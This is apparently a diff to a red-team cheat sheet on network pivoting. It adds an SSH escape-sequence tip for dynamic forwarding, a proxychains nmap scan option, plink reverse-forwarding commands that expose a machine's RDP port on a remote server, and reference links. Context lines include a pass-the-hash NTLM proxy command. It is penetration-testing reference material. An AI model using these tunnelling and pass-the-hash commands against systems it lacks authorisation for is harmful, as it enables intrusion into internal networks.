@@ -25,6 +25,13 @@ ssh -N -f -D 9000 [user]@[host]
 -N : do not execute a remote command
 ```
 
+Cool Tip : Konami SSH Port forwarding
+
+```bash
+[ENTER] + [~C]
+-D 1090
+```
+
 ### Local Port Forwarding
 
 ```bash
@@ -46,7 +53,7 @@ ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
 socks4 localhost 8080
 ```
 
-Set the SOCKS4 proxy then `proxychains nmap 192.168.5.6`
+Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`
 
 ## Web SOCKS - reGeorg
 
@@ -83,6 +90,14 @@ Passing the hash
 python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
 --ntlm-proxy-port 8080 --domain CORP --username jdoe \
 --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
+```
+
+## plink
+
+```powershell
+plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
+plink -l root -pw mypassword 192.168.18.84 -R
+plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
 ```
 
 ## Basic Pivoting Types
@@ -124,3 +139,5 @@ python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [pro
 
 * [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
 * [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
+* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
+* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
